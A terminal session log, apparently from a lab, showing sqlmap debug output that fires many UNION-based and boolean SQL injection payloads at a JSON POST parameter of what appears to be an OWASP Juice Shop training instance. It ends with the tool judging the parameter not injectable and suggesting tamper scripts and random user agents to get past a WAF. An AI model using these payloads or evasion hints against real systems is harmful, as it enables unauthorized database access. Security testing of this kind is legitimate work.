+[17:20:21] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:20:21] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- IrXA
+[17:20:21] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:20:21] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- EUHd
+[17:20:26] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:20:26] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ccnS
+[17:20:30] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:20:30] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- mltZ
+[17:20:34] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:20:34] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- armj
+[17:20:37] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:20:37] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- bNNm
+[17:20:41] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:20:41] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- jzdB
+[17:20:45] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:20:45] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Qkge
+[17:20:49] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:20:49] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ndzJ
+[17:20:53] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:20:53] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- eIdp
+[17:20:57] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:20:57] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UxBs
+[17:21:01] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:21:01] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- hJPY
+[17:21:05] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:21:05] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- RTHC
+[17:21:09] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:21:09] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- duEE
+[17:21:12] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:21:12] [DEBUG] skipping test 'Generic UNION query (random number) - 41 to 60 columns' because the level (4) is higher than the provided (3)
+[17:21:12] [DEBUG] skipping test 'Generic UNION query (NULL) - 61 to 80 columns' because the level (4) is higher than the provided (3)
+[17:21:12] [DEBUG] skipping test 'Generic UNION query (random number) - 61 to 80 columns' because the level (5) is higher than the provided (3)
+[17:21:12] [DEBUG] skipping test 'Generic UNION query (NULL) - 81 to 100 columns' because the level (5) is higher than the provided (3)
+[17:21:12] [DEBUG] skipping test 'Generic UNION query (random number) - 81 to 100 columns' because the level (5) is higher than the provided (3)
+[17:21:12] [DEBUG] skipping test 'MySQL UNION query (NULL) - 1 to 20 columns' because its declared DBMS is different than provided
+[17:21:12] [DEBUG] skipping test 'MySQL UNION query (random number) - 1 to 20 columns' because its declared DBMS is different than provided
+[17:21:12] [DEBUG] skipping test 'MySQL UNION query (NULL) - 21 to 40 columns' because its declared DBMS is different than provided
+[17:21:12] [DEBUG] skipping test 'MySQL UNION query (random number) - 21 to 40 columns' because its declared DBMS is different than provided
+[17:21:12] [DEBUG] skipping test 'MySQL UNION query (NULL) - 41 to 60 columns' because its declared DBMS is different than provided
+[17:21:12] [DEBUG] skipping test 'MySQL UNION query (random number) - 41 to 60 columns' because its declared DBMS is different than provided
+[17:21:12] [DEBUG] skipping test 'MySQL UNION query (NULL) - 61 to 80 columns' because its declared DBMS is different than provided
+[17:21:12] [DEBUG] skipping test 'MySQL UNION query (random number) - 61 to 80 columns' because its declared DBMS is different than provided
+[17:21:12] [DEBUG] skipping test 'MySQL UNION query (NULL) - 81 to 100 columns' because its declared DBMS is different than provided
+[17:21:12] [DEBUG] skipping test 'MySQL UNION query (random number) - 81 to 100 columns' because its declared DBMS is different than provided
+[17:21:12] [INFO] checking if the injection point on (custom) POST parameter 'JSON #1*' is a false positive
+[17:21:12] [PAYLOAD] admin@juice-sh.op) AND 8371=(SELECT (CASE WHEN (41=41) THEN 8371 ELSE (SELECT 4250 UNION SELECT 5283) END))-- dpDz
+[17:21:16] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:21:16] [WARNING] false positive or unexploitable injection point detected
+[17:21:16] [WARNING] (custom) POST parameter 'JSON #1*' does not seem to be injectable
+[17:21:16] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
+[17:21:16] [WARNING] HTTP error codes detected during run:
+429 (Too Many Requests) - 1 times, 403 (Forbidden) - 245 times
+[17:21:16] [DEBUG] too many 4xx and/or 5xx HTTP error codes could mean that some kind of protection is involved (e.g. WAF)
+[*] ending @ 17:21:16 /2026-04-24/
+[?2004h
+]0;yernur@yernur-VMware-Virtual-Platform: ~/Qwen3based
+yernur@yernur-VMware-Virtual-Platform:~/Qwen3based$ exit
+[?2004lexit
+Script done on 2026-04-24 17:21:37+05:00 [COMMAND_EXIT_CODE="0"]
